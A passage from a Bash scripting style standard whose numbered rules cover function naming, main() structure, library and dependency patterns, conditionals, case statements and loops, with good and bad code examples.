| Conditional | `[[ -f "$file" ]]` | `[[ -f $file ]]` |
| Array | `"${arr[@]}"` | `${arr[@]}` |
| Static literal | `== 'value'` | `== "value"` |

---

**Key principle:** Single quotes for static text, double quotes for variables, avoid unnecessary braces, always quote variables.


---


**Rule: BCS0400**

# Functions

Function definition patterns, naming (lowercase_with_underscores), and organization. Use `main()` for scripts >200 lines for structure/testability. Export functions for sourceable libraries with `declare -fx`. Remove unused utility functions in production.

**Organization (bottom-up)**: messaging functions �' helpers �' business logic �' `main()` last. Each function can safely call previously defined functions; readers understand primitives before composition.


---


**Rule: BCS0401**

## Function Definition Pattern

```bash
# Single-line functions for simple operations
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }

# Multi-line functions with local variables
main() {
  local -i exitcode=0
  local -- variable
  # Function body
  return "$exitcode"
}
```

**Key Points:**
- Single-line format for simple one-expression functions
- Multi-line with proper indentation for complex functions
- Declare locals at function start with `local -i` (integers) or `local --` (strings)
- Use `return "$exitcode"` for explicit exit status


---


**Rule: BCS0402**

## Function Names
Use lowercase with underscores; prefix private functions with underscore.

```bash
# ✓ Good - lowercase with underscores
my_function() {
  …
}

process_log_file() {
  …
}

# ✓ Private functions use leading underscore
_my_private_function() {
  …
}

_validate_input() {
  …
}

# ✗ Avoid - CamelCase or UPPER_CASE
MyFunction() {      # Don't do this
  …
}

PROCESS_FILE() {    # Don't do this
  …
}
```

**Rationale:** Matches Unix naming conventions; avoids confusion with variables; underscore prefix signals internal-only use.

**Anti-patterns:**
```bash
# ✗ Don't override built-in commands without good reason
cd() {           # Dangerous - overrides built-in cd
  builtin cd "$@" && ls
}

# ✓ If you must wrap built-ins, use a different name
change_dir() {
  builtin cd "$@" && ls
}

# ✗ Don't use special characters
my-function() {  # Dash creates issues in some contexts
  …
}
```


---


**Rule: BCS0403**

## Main Function

**Always include a `main()` function for scripts longer than ~200 lines. Place `main "$@"` at the bottom of the script, just before `#fin`.**

**Rationale:**
- Single entry point with clear execution flow
- Testability: source scripts without executing; test functions individually
- Scope control: local variables prevent global namespace pollution
- Centralized argument parsing, exit code handling, and debugging

**When to use main():**
```bash
# Use main() when: >200 lines, multiple functions, argument parsing, complex logic, testability needed
# Skip main() when: trivial (<200 lines), simple wrapper, no functions, linear flow
```

**Basic main() structure:**
```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ... helper functions ...

main() {
  while (($#)); do case $1 in
    -h|--help) show_help; return 0 ;;
    *) die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done

  info 'Starting processing...'
  return 0
}

main "$@"
#fin
```

**Main function with argument parsing:**
```bash
main() {
  local -i verbose=0 dry_run=0
  local -- output_file=''
  local -a input_files=()

  while (($#)); do case $1 in
    -n|--dry-run) dry_run=1 ;;
    -o|--output)
      noarg "$@"
      shift
      output_file=$1
      ;;
    -v|--verbose) verbose=1 ;;
    -q|--quiet)   verbose=0 ;;
    -h|--help)    usage; return 0 ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option ${1@Q}" ;;
    *)            input_files+=("$1") ;;
  esac; shift; done

  input_files+=("$@")
  readonly -- verbose dry_run output_file
  readonly -a input_files

  if ((${#input_files[@]} == 0)); then
    error 'No input files specified'
    usage
    return 22
  fi

  local -- file
  for file in "${input_files[@]}"; do
    process_file "$file"
  done
  return 0
}
```

**Main function with setup/cleanup:**
```bash
cleanup() {
  local -i exit_code=${1:-$?}
  if [[ -n "${TEMP_DIR:-}" && -d "$TEMP_DIR" ]]; then
    rm -rf "$TEMP_DIR"
  fi
  return "$exit_code"
}

main() {
  trap cleanup EXIT
  TEMP_DIR=$(mktemp -d)
  readonly -- TEMP_DIR
  info "Using temp directory ${TEMP_DIR@Q}"
  return 0
}

main "$@"
#fin
```

**Main function enabling sourcing for tests:**
```bash
# Only execute main if script is run directly (not sourced)
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

set -euo pipefail

main() {
  return 0
}

main "$@"
#fin
```

**Anti-patterns to avoid:**
```bash
# ✗ Wrong - no main function in complex script (200+ lines)
#!/bin/bash
# ... 200 lines of code directly in script - hard to test/organize

# ✓ Correct - main function
main() { ... }
main "$@"
#fin

# ✗ Wrong - main() not at end (functions defined after main executes)
main() { ... }
main "$@"
helper_function() { ... }  # Defined AFTER main is called!

# ✓ Correct - main() at end, called last
helper_function() { ... }
main() { ... }
main "$@"
#fin

# ✗ Wrong - parsing arguments outside main
verbose=0
while (($#)); do ... done  # Arguments consumed!
main() { ... }
main "$@"  # No arguments left!

# ✓ Correct - parsing in main
main() {
  local -i verbose=0
  while (($#)); do ... done
  readonly -- verbose
}
main "$@"

# ✗ Wrong - not passing arguments
main  # Missing "$@"!

# ✓ Correct
main "$@"
```

**Edge cases:**

**1. Script needs global configuration:**
```bash
declare -i VERBOSE=0 DRY_RUN=0

main() {
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    *) die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done
  readonly -- VERBOSE DRY_RUN
}
main "$@"
```

**2. Script is library and executable:**
```bash
utility_function() { ... }
main() { ... }

# Only run main if executed (not sourced)
[[ "${BASH_SOURCE[0]}" == "${0}" ]] || return
main "$@"
#fin
```

**3. Multiple main scenarios (subcommands):**
```bash
main_install() { ... }
main_uninstall() { ... }

main() {
  local -- mode=${1:-}
  case "$mode" in
    install)   shift; main_install "$@" ;;
    uninstall) shift; main_uninstall "$@" ;;
    *) die 22 "Invalid mode ${mode@Q}" ;;
  esac
}
main "$@"
```

**Summary:**
- **Use main() for scripts >200 lines** - organization and testability
- **Place main() at end** - define helpers first, main last
- **Always call with `main "$@"`** - pass all arguments
- **Parse arguments in main** - keep argument handling centralized
- **Make locals readonly after parsing** - immutable option state
- **Consider sourcing** - use `[[ "${BASH_SOURCE[0]}" == "${0}" ]]` for testability
- **main() is the orchestrator** - coordinates helpers, doesn't do heavy lifting


---


**Rule: BCS0404**

## Function Export
```bash
# Export functions when needed by subshells
grep() { /usr/bin/grep "$@"; }
find() { /usr/bin/find "$@"; }
declare -fx grep find
```


---


**Rule: BCS0405**

## Production Script Optimization

Once a script is mature and ready for production:
- Remove unused utility functions (e.g., `yn()`, `decp()`, `trim()`, `s()`)
- Remove unused global variables (e.g., `SCRIPT_DIR`, `PROMPT`, `DEBUG`)
- Remove unused messaging functions not called by your script
- Keep only the functions and variables your script actually needs

**Rationale:** Reduces script size, improves clarity, eliminates maintenance burden.

**Example:** A simple script may only need `error()` and `die()`, not the full messaging suite.


---


**Rule: BCS0406**

## Dual-Purpose Scripts

**Rule: BCS0606** (Elevated from BCS010201)

Scripts that can be both executed directly and sourced as libraries.

---

#### Rationale

- Reusable functions without code duplication
- Direct execution for standalone use, library sourcing for integration
- Testing flexibility (source functions, run tests)

---

#### Basic Pattern

```bash
#!/usr/bin/env bash
# my-lib.sh - Dual-purpose library/script

# Define functions first (before any set -e)
my_function() {
  local -- arg=$1
  echo "Processing ${arg@Q}"
}
declare -fx my_function

# Check if sourced or executed
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Everything below runs only when executed directly
set -euo pipefail
shopt -s inherit_errexit shift_verbose

# Script metadata
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}

main() {
  my_function "$@"
}

main "$@"
#fin
```

#### With Idempotent Initialization

```bash
#!/usr/bin/env bash
# Prevent double-initialization when sourced

[[ -v MY_LIB_VERSION ]] || {
  declare -rx MY_LIB_VERSION=1.0.0
  declare -rx MY_LIB_PATH=$(realpath -e -- "${BASH_SOURCE[0]}")
}

# Functions defined here...
my_func() { :; }
declare -fx my_func

# Source-mode exit
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Execution mode
set -euo pipefail
main() { my_func "$@"; }
main "$@"
#fin
```

#### Why set -e Comes After Check

`set -e` must come AFTER the sourced check:
- When sourced, parent script controls error handling
- Library code should not impose error handling on caller

```bash
# ✗ Wrong - set -e before source check
set -euo pipefail
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0  # Risky

# ✓ Correct - set -e after source check
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0
set -euo pipefail
```

---

#### Using Dual-Purpose Scripts

```bash
# As executable
./my-lib.sh arg1 arg2

# As library (source for functions)
source ./my-lib.sh
my_function "value"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - functions not exported
my_func() { :; }
# Cannot be called from subshells after sourcing

# ✓ Correct - export functions
my_func() { :; }
declare -fx my_func
```

---

**See Also:** BCS0607 (Library Patterns), BCS0604 (Function Export)

**Full implementation:** See `examples/exemplar-code/internetip/internetip`


---


**Rule: BCS0407**

## Library Patterns

**Rule: BCS0607**

Patterns for creating reusable Bash libraries.

---

#### Rationale

Well-designed libraries provide code reuse, consistent interfaces, easier testing/maintenance, and namespace isolation.

---

#### Pure Function Library

```bash
#!/usr/bin/env bash
# lib-validation.sh - Validation function library
#
# Usage: source lib-validation.sh

# Prevent execution
[[ "${BASH_SOURCE[0]}" != "$0" ]] || {
  >&2 echo 'Error: This file must be sourced, not executed'
  exit 1
}

# Library version
declare -rx LIB_VALIDATION_VERSION=1.0.0

# Validation functions
valid_ip4() {
  local -- ip=$1
  [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
  local -a octets
  IFS='.' read -ra octets <<< "$ip"
  for octet in "${octets[@]}"; do
    ((octet <= 255)) || return 1
  done
  return 0
}
declare -fx valid_ip4

valid_email() {
  [[ $1 =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$ ]]
}
declare -fx valid_email

#fin
```

#### Library with Configuration

```bash
#!/usr/bin/env bash
# lib-config.sh - Configuration management library

[[ "${BASH_SOURCE[0]}" != "$0" ]] || return 1

# Configurable defaults (can be overridden before sourcing)
: "${CONFIG_DIR:=/etc/myapp}"
: "${CONFIG_FILE:="$CONFIG_DIR"/config}"

load_config() {
  [[ -f "$CONFIG_FILE" ]] || return 1
  source "$CONFIG_FILE"
}
declare -fx load_config

get_config() {
  local -- key=$1 default=${2:-}
  local -- value
  value=$(grep "^${key}=" "$CONFIG_FILE" 2>/dev/null | cut -d= -f2-)
  echo "${value:-$default}"
}
declare -fx get_config

#fin
```

#### Namespace Pattern

```bash
#!/usr/bin/env bash
# lib-myapp.sh - Namespaced library

[[ "${BASH_SOURCE[0]}" != "$0" ]] || exit 1

# All functions prefixed with namespace
myapp_init() { :; }
myapp_cleanup() { :; }
myapp_process() { :; }

declare -fx myapp_init myapp_cleanup myapp_process

#fin
```

#### Sourcing Libraries

```bash
# Source with path resolution
SCRIPT_DIR=${BASH_SOURCE[0]%/*}
source "$SCRIPT_DIR"/lib-validation.sh

# Source with existence check
lib_path='/usr/local/lib/myapp/lib-utils.sh'
[[ -f "$lib_path" ]] && source "$lib_path" || die 1 "Missing library ${lib_path@Q}"

# Source multiple libraries
for lib in "$LIB_DIR"/*.sh; do
  [[ -f "$lib" ]] && source "$lib" ||:
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - library has side effects on source
source lib.sh  # Immediately modifies global state

# ✓ Correct - library only defines functions
source lib.sh  # Only defines functions
lib_init       # Explicit initialization call
```

---

**See Also:** BCS0606 (Dual-Purpose Scripts), BCS0608 (Dependency Management)

**Full implementation:** See `examples/exemplar-code/internetip/validip`


---


**Rule: BCS0408**

## Dependency Management

**Rule: BCS0608**

Checking and managing external dependencies in Bash scripts.

---

#### Rationale

Proper dependency management provides clear error messages for missing tools, enables graceful degradation, documents script requirements, and supports portability checking.

---

#### Basic Dependency Check

```bash
# Check single command
command -v curl >/dev/null || die 1 'curl is required but not installed'

# Check multiple commands
for cmd in curl jq awk; do
  command -v "$cmd" >/dev/null || die 1 "Required ${cmd@Q}"
done
```

#### Dependency Check Function

```bash
check_dependencies() {
  local -a missing=()
  local -- cmd

  for cmd in "$@"; do
    command -v "$cmd" >/dev/null || missing+=("$cmd")
  done

  if ((${#missing[@]})); then
    error "Missing dependencies: ${missing[*]}"
    info 'Install with: sudo apt install ...'
    return 1
  fi
}

# Usage
check_dependencies curl jq sqlite3 || exit 1
```

#### Optional Dependencies

```bash
# Check and set availability flag
declare -i HAS_JQ=0
command -v jq >/dev/null && HAS_JQ=1 ||:

# Use with fallback
if ((HAS_JQ)); then
  result=$(echo "$json" | jq -r '.field')
else
  result=$(echo "$json" | grep -oP '"field":\s*"\K[^"]+')
fi
```

#### Version Checking

```bash
check_bash_version() {
  local -i major=${BASH_VERSINFO[0]}
  local -i minor=${BASH_VERSINFO[1]}

  if ((major < 5 || (major == 5 && minor < 2))); then
    die 1 "Requires Bash 5.2+, found $BASH_VERSION"
  fi
}

check_tool_version() {
  local -- tool=$1 min_version=$2
  local -- current_version

  current_version=$("$tool" --version 2>&1 | head -1 | grep -oE '[0-9]+\.[0-9]+')

  if [[ "$(printf '%s\n' "$min_version" "$current_version" | sort -V | head -1)" != "$min_version" ]]; then
    die 1 "$tool version $min_version+ required, found $current_version"
  fi
}
```

#### Lazy Loading

```bash
# Initialize expensive resources only when needed
declare -- SQLITE_DB=''

get_db() {
  if [[ -z "$SQLITE_DB" ]]; then
    command -v sqlite3 >/dev/null || die 1 'sqlite3 required'
    SQLITE_DB=$(mktemp)
    sqlite3 "$SQLITE_DB" 'CREATE TABLE cache (key TEXT, value TEXT)'
  fi
  echo "$SQLITE_DB"
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - using which (not POSIX, unreliable)
which curl >/dev/null

# ✓ Correct - use command -v (POSIX compliant)
command -v curl >/dev/null

# ✗ Wrong - silent failure on missing dependency
curl "$url"  # Cryptic error if curl missing

# ✓ Correct - explicit check with helpful message
command -v curl >/dev/null || die 1 'curl required: apt install curl'
curl "$url"
```

---

**See Also:** BCS0607 (Library Patterns)


---


**Rule: BCS0500**

# Control Flow

Patterns for conditionals, loops, case statements, and arithmetic. Use `[[ ]]` over `[ ]` for tests, `(())` for arithmetic conditionals. Prefer process substitution (`< <(command)`) over pipes to while loops to avoid subshell variable persistence issues. Safe arithmetic: use `i+=1` instead of `((i+=1))`, or `((i++))` which returns original value and fails with `set -e` when i=0.


---


**Rule: BCS0501**

## Conditionals

**Use `[[ ]]` for string/file tests, `(())` for arithmetic.**

```bash
# String and file tests - use [[ ]]
[[ -d "$path" ]] && echo 'Directory exists' ||:
[[ -f "$file" ]] || die 1 "File not found ${file@Q}"
[[ "$status" == success ]] && continue ||:

# Arithmetic tests - use (())
((VERBOSE==0)) || echo 'Verbose mode'
((count >= MAX_RETRIES)) && die 1 'Too many retries' ||:

# Complex conditionals - combine both
if [[ -n "$var" ]] && ((count)); then
  process_data
fi
```

**Why `[[ ]]` over `[ ]`:**
- No word splitting or glob expansion on variables
- Pattern matching with `==` and `=~` operators
- Logical operators `&&`/`||` work inside (no `-a`/`-o` needed)
- String comparison with `<`, `>` (lexicographic)

**Comparison of `[[ ]]` vs `[ ]`:**

```bash
var='two words'

# ✗ [ ] requires quotes or fails
[ $var = 'two words' ]  # ERROR: too many arguments

# ✓ [[ ]] handles unquoted variables (but quote anyway)
[[ "$var" == 'two words' ]]  # Recommended

# Pattern matching (only works in [[ ]])
[[ "$file" == *.txt ]] && echo "Text file"
[[ "$input" =~ ^[0-9]+$ ]] && echo "Number"

# Logical operators inside [[ ]]
[[ -f "$file" && -r "$file" ]] && cat "$file" ||:
```

**Arithmetic conditionals - use `(())`:**

```bash
# ✓ Correct - natural C-style syntax
((count)) && echo "Count: $count"
((i >= MAX)) && die 1 'Limit exceeded' ||:

# ✗ Wrong - using [[ ]] for arithmetic
[[ "$count" -gt 0 ]]  # Verbose, error-prone

# Comparison operators in (())
((a > b))   ((a >= b))  ((a < b))
((a <= b))  ((a == b))  ((a != b))
```

**Pattern matching:**

```bash
# Glob pattern matching
[[ "$filename" == *.@(jpg|png|gif) ]] && process_image "$filename" ||:

# Regular expression matching
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
  echo 'Valid email'
fi

# Case-insensitive matching
shopt -s nocasematch
[[ "$input" == yes ]] && echo "Affirmative"  # Matches YES, Yes, yes
shopt -u nocasematch
```

**Short-circuit evaluation:**

```bash
[[ -f "$config" ]] && source "$config" ||:  # Execute if first succeeds
[[ -d "$dir" ]] || mkdir -p "$dir"          # Execute if first fails
((count)) || die 1 'No items to process'
```

**Anti-patterns:**

```bash
# ✗ Using old [ ] syntax
if [ -f "$file" ]; then  # Use [[ ]] instead

# ✗ Using -a and -o in [ ]
[ -f "$file" -a -r "$file" ]  # Deprecated, fragile

# ✓ Use [[ ]] with && and ||
[[ -f "$file" && -r "$file" ]]

# ✗ Arithmetic with [[ ]] using -gt/-lt
[[ "$count" -gt 10 ]]  # Verbose

# ✓ Use (()) for arithmetic
((count > 10))
```

**File test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-e file` | File exists |
| `-f file` | Regular file |
| `-d dir` | Directory |
| `-r file` | Readable |
| `-w file` | Writable |
| `-x file` | Executable |
| `-s file` | Not empty (size > 0) |
| `-L link` | Symbolic link |
| `file1 -nt file2` | file1 newer than file2 |
| `file1 -ot file2` | file1 older than file2 |

**String test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-z "$str"` | String is empty |
| `-n "$str"` | String is not empty |
| `"$a" == "$b"` | Strings equal |
| `"$a" != "$b"` | Strings not equal |
| `"$a" < "$b"` | Lexicographic less than |
| `"$a" > "$b"` | Lexicographic greater than |
| `"$str" =~ regex` | Matches regex |
| `"$str" == pattern` | Matches glob pattern |


---


**Rule: BCS0502**

## Case Statements

**Use `case` for multi-way branching on pattern matching. More readable and efficient than if/elif chains for single-value tests. Use compact format for simple single-action cases, expanded format for multi-line logic. Always align actions consistently.**

**Rationale:**
- Pattern matching: Native wildcards, alternation, character classes
- Performance: Single evaluation vs multiple if/elif tests
- Maintainability: Easy to add/remove/reorder cases
- `*)` default ensures all possibilities handled

**When to use case vs if/elif:**

```bash
# ✓ Use case - single variable against multiple values
case "$action" in
  start)   start_service ;;
  stop)    stop_service ;;
  restart) restart_service ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✓ Use case - pattern matching needed
case "$filename" in
  *.txt) process_text_file ;;
  *.pdf) process_pdf_file ;;
  *)     die 22 'Unsupported file type' ;;
esac

# ✗ Use if/elif - testing different variables or complex conditions
if [[ ! -f "$file" ]]; then
  die 2 "File not found ${file@Q}"
elif [[ ! -r "$file" ]]; then
  die 1 "File not readable ${file@Q}"
fi
```

**Case expression quoting:**

No quotes needed on case expression—word splitting doesn't apply:

```bash
# ✓ CORRECT - no quotes needed
case ${1:-} in
  --help) show_help ;;
esac

# ✗ UNNECESSARY - quotes don't add value
case "${1:-}" in
  --help) show_help ;;
esac
```

**Compact format** - single-action cases, `;;` on same line, aligned at column 14-18:

```bash
while (($#)); do
  case $1 in
    -n|--dry-run) DRY_RUN=1 ;;
    -f|--force)   FORCE=1 ;;
    -V|--version) echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -o|--output)  noarg "$@"; shift; OUTPUT_FILE=$1 ;;
    -v|--verbose) VERBOSE+=1 ;;
    -h|--help)    show_help; exit 0 ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option ${1@Q}" ;;
    *)            INPUT_FILES+=("$1") ;;
  esac
  shift
done
```

**Expanded format** - multi-line actions, `;;` on separate line:

```bash
while (($#)); do
  case $1 in
    -p|--prefix)   noarg "$@"
                   shift
                   PREFIX=$1
                   BIN_DIR="$PREFIX"/bin
                   ((VERBOSE)) && info "Prefix set to: $PREFIX" ||:
                   ;;

    -[bpvqVh]*) #shellcheck disable=SC2046 #split up single options
                   set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
                   ;;

    -*)            die 22 "Invalid option ${1@Q}" ;;
  esac
  shift
done
```

**Pattern matching syntax:**

```bash
# Literal patterns
case "$value" in
  start) echo 'Starting...' ;;
  stop)  echo 'Stopping...' ;;
esac

# Wildcard patterns
case "$filename" in
  *.txt) echo 'Text file' ;;
  *.pdf) echo 'PDF file' ;;
  *)     echo 'Unknown' ;;
esac

# Alternation (OR patterns)
case "$option" in
  -h|--help|help) show_help; exit 0 ;;
  *.txt|*.md|*.rst) echo 'Text document' ;;
esac

# Character classes with extglob
shopt -s extglob
case "$input" in
  ?(pattern))     echo 'zero or one' ;;
  *(pattern))     echo 'zero or more' ;;
  +(pattern))     echo 'one or more' ;;
  @(start|stop))  echo 'exactly one' ;;
  !(*.tmp|*.bak)) echo 'anything except' ;;
esac

# Bracket expressions
case "$char" in
  [0-9])          echo 'Digit' ;;
  [a-z])          echo 'Lowercase' ;;
  [!a-zA-Z0-9])   echo 'Special character' ;;
esac
```

**Anti-patterns:**

```bash
# ✗ Wrong - quoting patterns unnecessarily
case "$value" in
  "start") echo 'Starting...' ;;  # Don't quote literal patterns
esac

# ✓ Correct - unquoted literal patterns
case "$value" in
  start) echo 'Starting...' ;;
esac

# ✗ Wrong - using if/elif for simple pattern matching
if [[ "$ext" == 'txt' ]]; then
  process_text
elif [[ "$ext" == 'pdf' ]]; then
  process_pdf
fi

# ✓ Correct - case is clearer
case "$ext" in
  txt) process_text ;;
  pdf) process_pdf ;;
  *)   die 1 'Unknown type' ;;
esac

# ✗ Wrong - missing default case
case "$action" in
  start) start_service ;;
  stop)  stop_service ;;
esac  # What if $action is 'restart'? Silent failure!

# ✗ Wrong - inconsistent format mixing
case "$opt" in
  -v) VERBOSE=1 ;;
  -o) shift
      OUTPUT=$1
      ;;              # Mixing compact and expanded
esac

# ✗ Wrong - missing ;; terminator
case "$value" in
  start) start_service
  stop) stop_service   # Missing ;;
esac

# ✗ Wrong - regex patterns (not supported)
case "$input" in
  [0-9]+) echo 'Number' ;;  # Matches single digit only!
esac

# ✓ Correct - use extglob or if with regex
case "$input" in
  +([0-9])) echo 'Number' ;;  # Requires extglob
esac

# ✗ Wrong - side effects in patterns
case "$value" in
  $(complex_function)) echo 'Match' ;;  # Called for every case!
esac

# ✓ Correct - evaluate once before case
result=$(complex_function)
case "$value" in
  "$result") echo 'Match' ;;
esac

# ✗ Wrong - nested case for multiple variables
case "$var1" in
  value1) case "$var2" in
    value2) action ;;
  esac ;;
esac

# ✓ Correct - use if for multiple variable tests
if [[ "$var1" == value1 && "$var2" == value2 ]]; then
  action
fi
```

**Edge cases:**

```bash
# Empty string handling
case "$value" in
  '')  echo 'Empty string' ;;
  *)   echo "Value: $value" ;;
esac

# Special characters - quote patterns
case "$filename" in
  'file (1).txt')      echo 'Match parentheses' ;;
  'file [backup].txt') echo 'Match brackets' ;;
esac

# Numeric patterns (as strings)
case "$port" in
  80|443)  echo 'Standard web port' ;;
  [0-9][0-9][0-9][0-9]) echo 'Four-digit port' ;;
esac
# For numeric comparison, use (()) instead

# Return values in functions
validate_input() {
  local -- input=$1
  case "$input" in
    [a-z]*) return 0 ;;
    [A-Z]*) return 1 ;;
    '')     return 22 ;;
    *)      return 1 ;;
  esac
}
```

**Summary:**
- Use case for pattern matching single variable against multiple patterns
- Compact format: single-line actions with aligned `;;`
- Expanded format: multi-line actions with `;;` on separate line
- Don't quote case expression; don't quote literal patterns
- Always include `*)` default case
- Use `|` for alternation, `*` `?` for wildcards, extglob for advanced patterns
- Use if/elif for multiple variables, ranges, complex conditions
- Terminate every branch with `;;`


---


**Rule: BCS0503**

## Loops

**Use loops to iterate over collections, process command output, or repeat operations. Prefer array iteration over string parsing, use process substitution to avoid subshell issues, and employ proper loop control with `break` and `continue`.**

**Rationale:**
- For loops efficiently iterate over arrays, globs, and ranges
- While loops process line-by-line input from commands or files
- `"${array[@]}"` preserves element boundaries; `< <(command)` avoids subshell scope issues
- Break and continue enable early exit and conditional processing

**For loops - Array iteration:**

```bash
# ✓ Iterate over array elements
local -a files=('document.txt' 'file with spaces.pdf')
local -- file
for file in "${files[@]}"; do
  [[ -f "$file" ]] && info "Processing ${file@Q}"
done

# ✓ Iterate with index
local -a items=('alpha' 'beta' 'gamma')
local -i index
for index in "${!items[@]}"; do
  info "Item $index: ${items[$index]}"
done

# ✓ Iterate over arguments
for arg in "$@"; do info "Argument: $arg"; done
```

**For loops - Glob patterns:**

```bash
# nullglob ensures empty loop if no matches
shopt -s nullglob
for file in "$SCRIPT_DIR"/*.txt; do
  info "Processing ${file@Q}"
done

# Multiple patterns (check existence for brace expansion)
for file in "$SCRIPT_DIR"/*.{txt,md,rst}; do
  [[ -f "$file" ]] && info "Processing ${file@Q}"
done

# Recursive glob (requires globstar)
shopt -s globstar
for script in "$SCRIPT_DIR"/**/*.sh; do
  [[ -f "$script" ]] && shellcheck "$script"
done
```

**For loops - C-style:**

```bash
# ✓ C-style for loop (use +=1, not ++)
for ((i=1; i<=10; i+=1)); do echo "Count: $i"; done

# ✓ Iterate with step
for ((i=0; i<=20; i+=2)); do echo "Even: $i"; done

# ✓ Countdown
for ((i=seconds; i>0; i-=1)); do sleep 1; done
```

**For loops - Brace expansion:**

```bash
for i in {1..10}; do echo "$i"; done           # Range
for i in {0..100..10}; do echo "$i"; done      # With step
for letter in {a..z}; do echo "$letter"; done  # Characters
for env in {dev,staging,prod}; do deploy "$env"; done
for file in file{001..100}.txt; do touch "$file"; done  # Zero-padded
```

**While loops - Reading input:**

```bash
# ✓ Read file line by line
while IFS= read -r line; do
  echo "$line"
done < "$file"

# ✓ Process command output (avoid subshell)
while IFS= read -r line; do
  count+=1
done < <(find "$SCRIPT_DIR" -name '*.txt' -type f)

# ✓ Null-delimited input (handles special filenames)
while IFS= read -r -d '' file; do
  info "Processing: $file"
done < <(find "$SCRIPT_DIR" -name '*.sh' -type f -print0)

# ✓ CSV with custom delimiter
while IFS=',' read -r name email age; do
  info "Name: $name, Email: $email, Age: $age"
done < "$csv_file"
```

**While loops - Argument parsing:**

```bash
while (($#)); do
  case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -o|--output)  noarg "$@"; shift; OUTPUT_DIR=$1 ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option ${1@Q}" ;;
    *)            INPUT_FILES+=("$1") ;;
  esac
  shift
done
INPUT_FILES+=("$@")  # Collect remaining after --
```

**While loops - Condition-based:**

```bash
# ✓ Wait for condition with timeout
while [[ ! -f "$file" ]]; do
  ((elapsed >= timeout)) && { error "Timeout"; return 1; }
  sleep 1; elapsed+=1
done

# ✓ Retry with exponential backoff
while ((attempt <= max_attempts)); do
  some_command && return 0
  ((attempt < max_attempts)) && sleep "$wait_time"
  wait_time=$((wait_time * 2)); attempt+=1
done
```

**Until loops:**

```bash
# ✓ Loop UNTIL service is running
until systemctl is-active --quiet "$service"; do
  ((elapsed >= timeout)) && return 1
  sleep 1; elapsed+=1
done

# ✗ Confusing until - prefer while with opposite condition
until [[ ! -f "$lock_file" ]]; do sleep 1; done  # Confusing
while [[ -f "$lock_file" ]]; do sleep 1; done    # ✓ Clearer
```

**Loop control - break and continue:**

```bash
# ✓ Early exit with break
for file in "${files[@]}"; do
  [[ "$file" =~ $pattern ]] && { found="$file"; break; }
done

# ✓ Skip items with continue
for file in "${files[@]}"; do
  [[ ! -f "$file" ]] && { skipped+=1; continue; }
  [[ ! -r "$file" ]] && { skipped+=1; continue; }
  process "$file"; processed+=1
done

# ✓ Break out of nested loops with level
for row in "${matrix[@]}"; do
  for col in $row; do
    [[ "$col" == 'target' ]] && break 2  # Break both loops
  done
done
```

**Infinite loops:**

> **Performance (Bash 5.2.21, Intel i9-13900HX):**
> - `while ((1))` — **Fastest** ⚡
> - `while :` — +9-14% slower (use for POSIX)
> - `while true` — +15-22% slower 🐌 (avoid)

```bash
# ✓ RECOMMENDED - fastest
while ((1)); do
  systemctl is-active --quiet "$service" || error "Service down!"
  sleep "$interval"
done

# ✓ ACCEPTABLE - POSIX-compatible
while :; do process_item || break; sleep 1; done

# ✗ AVOID - slowest
while true; do check_status; sleep 5; done
```

**Anti-patterns:**

```bash
# ✗ Iterating unquoted string
for file in $files_str; do echo "$file"; done  # Word splitting!
# ✓ Use array
for file in "${files[@]}"; do echo "$file"; done

# ✗ Parsing ls output
for file in $(ls *.txt); do process "$file"; done  # NEVER!
# ✓ Use glob directly
for file in *.txt; do process "$file"; done

# ✗ Pipe to while (subshell loses variables)
cat file.txt | while read -r line; do count+=1; done
echo "$count"  # Still 0!
# ✓ Process substitution
while read -r line; do count+=1; done < <(cat file.txt)

# ✗ Unquoted array expansion
for item in ${array[@]}; do echo "$item"; done
# ✓ Quoted
for item in "${array[@]}"; do echo "$item"; done

# ✗ C-style loop with ++ (fails with set -e when i=0)
for ((i=0; i<10; i++)); do echo "$i"; done
# ✓ Use +=1
for ((i=0; i<10; i+=1)); do echo "$i"; done

# ✗ Redundant comparison
while (($# > 0)); do shift; done
# ✓ Idiomatic
while (($#)); do shift; done

# ✗ Ambiguous break in nested loops
for i in {1..10}; do for j in {1..10}; do break; done; done
# ✓ Explicit break level
for i in {1..10}; do for j in {1..10}; do break 2; done; done

# ✗ Missing -r flag
while read line; do echo "$line"; done < file.txt
# ✓ Always use -r
while IFS= read -r line; do echo "$line"; done < file.txt
```

**Edge cases:**

```bash
# Empty array - zero iterations, no errors
for item in "${empty[@]}"; do echo "$item"; done
